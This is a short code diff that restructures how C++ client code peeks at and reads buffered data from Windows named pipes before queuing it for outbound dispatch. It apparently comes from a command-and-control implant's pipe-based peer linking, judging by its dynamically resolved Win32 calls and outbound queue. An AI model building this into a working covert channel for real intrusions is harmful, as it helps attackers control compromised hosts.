@@ -154,32 +154,30 @@ namespace Clients {
             uint32_t total  = 0;
             uint32_t read   = 0;
 
+            if (!Ctx->win32.PeekNamedPipe(client->pipe_handle, &bound, sizeof(uint8_t), nullptr, R_CAST(LPDWORD, &read), nullptr) || read != sizeof(uint8_t)) {
+                continue;
+            }
             if (!Ctx->win32.PeekNamedPipe(client->pipe_handle, nullptr, 0, nullptr, R_CAST(LPDWORD, &total), nullptr)) {
                 continue;
             }
 
-            if (total >= sizeof(uint32_t)) {
-                if (!Ctx->win32.PeekNamedPipe(client->pipe_handle, &bound, sizeof(uint8_t), nullptr, nullptr, nullptr)) {
+            if (bound == 0 && total >= sizeof(uint32_t)) {
+                if (!(buffer = x_malloc(total)) || !(in = Stream::CreateStream())) {
+                    return_defer(ntstatus);
+                }
+
+                if (!Ctx->win32.ReadFile(client->pipe_handle, buffer, total, R_CAST(LPDWORD, &read), nullptr) || read != total) {
+                    Stream::DestroyStream(in);
+                    x_free(buffer);
+
                     continue;
                 }
 
-                if (bound == 0) {
-                    if (!(buffer = x_malloc(total)) || !(in = Stream::CreateStream())) {
-                        return_defer(ntstatus);
-                    }
+                in->buffer = buffer;
+                in->length += total;
 
-                    if (!Ctx->win32.ReadFile(client->pipe_handle, buffer, total, R_CAST(LPDWORD, &read), nullptr) || read != total) {
-                        Stream::DestroyStream(in);
-                        x_free(buffer);
+                Dispatcher::OutboundQueue(in);
 
-                        continue;
-                    }
-
-                    in->buffer = buffer;
-                    in->length += total;
-
-                    Dispatcher::OutboundQueue(in);
-                }
             } else {
                 continue;
             }
